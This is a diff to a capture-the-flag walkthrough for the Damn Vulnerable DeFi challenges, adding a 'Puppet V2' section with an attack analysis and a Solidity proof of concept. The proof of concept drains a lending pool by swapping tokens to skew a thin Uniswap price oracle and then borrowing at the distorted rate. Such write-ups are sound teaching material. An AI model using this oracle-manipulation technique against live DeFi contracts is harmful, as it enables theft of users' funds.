@@ -391,7 +391,7 @@ Run `forge test --mp test/compromised/Compromised.t.sol --isolate` to validate t
 
 _from `_isSolved()`in test_
 
-1. _Player executed a single transaction_ **UNACHIEVABLE?**
+1. _Player executed a single transaction_ `UNACHIEVABLE?`
 2. _All tokens of the lending pool were deposited into the recovery account_
 
 ### Attack Analysis
@@ -434,5 +434,50 @@ contract Attack {
 ```
 
 Run `forge test --mp test/puppet/Puppet.t.sol --isolate` to validate test
+
+---
+
+## 9.PUPPET V2
+
+### Objective
+
+_from `_isSolved()`in test_
+
+1. _All tokens of the lending pool were deposited into the recovery account_
+
+### Attack Analysis
+
+- The implementation is still vulnerable becuase pool gets the price from a pool and it can still manipulated by an attacker. Plus, balances are low, which facilitates the manipulation.
+- An attacker could swap DVT tokens in the Uniswap Pool and influence the prices of the Lending Pool. This being particular easy in this case because of the low amount of assets in the pool.
+- Then, the attacker could borrow assets in the lending pool at an unexpected price and drain its liquidity.
+
+### POC
+
+See [test/puppet-v2/PuppetV2.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet-v2/PuppetV2.t.sol)
+
+```solidity
+function test_puppetV2() public checkSolvedByPlayer {
+    address[] memory path = new address[](2);
+    path[0] = address(token);
+    path[1] = address(weth);
+
+    require(token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE), "Token approve failed");
+    uniswapV2Router.swapExactTokensForTokens(
+        PLAYER_INITIAL_TOKEN_BALANCE,
+        1,
+        path,
+        address(player),
+        block.timestamp
+    );
+    weth.deposit{value: address(player).balance}();
+    require(weth.approve(address(lendingPool), weth.balanceOf(address(player))), "Weth approve failed");
+
+    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+    token.transfer(recovery, token.balanceOf(address(player)));
+}
+
+```
+
+Run `forge test --mp test/puppet-v2/PuppetV2.t.sol --isolate` to validate test
 
 ---
